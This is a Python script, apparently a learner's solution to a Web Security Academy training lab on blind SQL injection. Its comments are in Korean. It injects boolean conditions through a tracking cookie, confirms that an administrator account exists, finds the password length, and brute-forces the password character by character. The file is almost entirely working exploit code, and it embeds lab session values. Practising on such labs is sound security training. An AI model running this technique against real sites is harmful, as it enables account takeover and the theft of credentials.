# Lab: Blind SQL injection with conditional responses

import requests

# url = "https://0a9500b8032092f9801a0d8900a70034.web-security-academy.net/login"
# cookies ={
#     'TrackingId':'Lk689r5Kqx8U1TS9',
#     'session':'6HDF8IhpdyvQXBQAFznDqxanUBm06it6'
# }
# r= requests.get(url, cookies=cookies)
# print("Welcome back" in r.text)

url = "https://0a9500b8032092f9801a0d8900a70034.web-security-academy.net/login"
session = "6HDF8IhpdyvQXBQAFznDqxanUBm06it6"

def is_true(payload):
    cookies = {"TrackingId":payload, "session": session}
    r = requests.get(url, cookies=cookies)
    return "Welcome back" in r.text

#print(is_true("Lk689r5Kqx8U1TS9' AND '1'='1"))  # return True
#print(is_true("Lk689r5Kqx8U1TS9' AND '1'='2"))  # return False
#print(is_true("Lk689r5Kqx8U1TS9' AND (SELECT 'a' FROM users LIMIT 1)='a"))
    # users 테이블이 존재하는지 확인하는 코드
    # SELECT 'a' FROM users LIMIT 1 는 users 테이블 내 존재하면 "a" 리턴
    # 리턴된 값 (기대 'a')과 'a' 비교하여 일치 여부 확인
#print(is_true("Lk689r5Kqx8U1TS9' AND (SELECT 'a' FROM users WHERE username='administrator')='a"))
    # users 테이블 내 username이 administrator인 계정이 존재하는지 확인
#print(is_true("Lk689r5Kqx8U1TS9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a"))
    # return True => username이 administrator인 사용자 암호의 길이는 1보다 크다
#print(is_true("Lk689r5Kqx8U1TS9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a"))
    # return True => username이 administrator인 사용자 암호의 길이는 20이다.
'''
for i in range(1, 1000):
    payload_pass_len=f"Lk689r5Kqx8U1TS9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={i})='a"
    if is_true(payload_pass_len):
        print(f"password len is {i}")
        break
# passwod len is 20
'''

#print(is_true("Lk689r5Kqx8U1TS9' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a"))

chars = [chr(c) for c in range(ord('a'), ord('z')+1)]
chars += [str(d) for d in range(0, 10)]

password=""
for j in range(1, 21):
    for ch in chars:   # 리스트를 그대로 순회 (숫자 포함)
        payload_pass = f"Lk689r5Kqx8U1TS9' AND (SELECT SUBSTRING(password,{j},1) FROM users WHERE username='administrator')='{ch}"
        if is_true(payload_pass):
            print(f"Found {j}th password is {ch}")
            password += ch   # 글자만 붙이기
            break

print(f"administartor's password: {password}")